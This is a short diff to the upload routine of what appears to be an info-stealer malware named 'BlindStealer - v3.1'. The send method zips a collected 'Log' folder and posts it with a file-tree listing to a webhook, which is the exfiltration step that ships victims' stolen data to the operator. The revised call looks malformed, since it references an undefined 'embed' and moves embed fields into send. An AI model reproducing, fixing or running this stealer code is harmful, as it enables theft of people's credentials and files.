@@ -59,14 +59,12 @@ class Upload:
                 zip.write(f"Log\\{file}", file)
 
     def send(self):
-        self.webhook.send(
-            embed=Embed(
-                title="Log",
-                description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
-                username="BlindStealer - v3.1",
-                avatar_url="https://i.imgur.com/LNVOaxg.png",
-            ),
-            file=File("Log.zip"),
+            self.webhook.send(
+              embed=embed,
+              file=File("Log.zip"),
+              username="BlindStealer - v3.1",
+              avatar_url="https://i.imgur.com/LNVOaxg.png",
+              description="```" + '\n'.join(self.tree(Path("Log"))) + "```"
         )
 
     def clean(self):
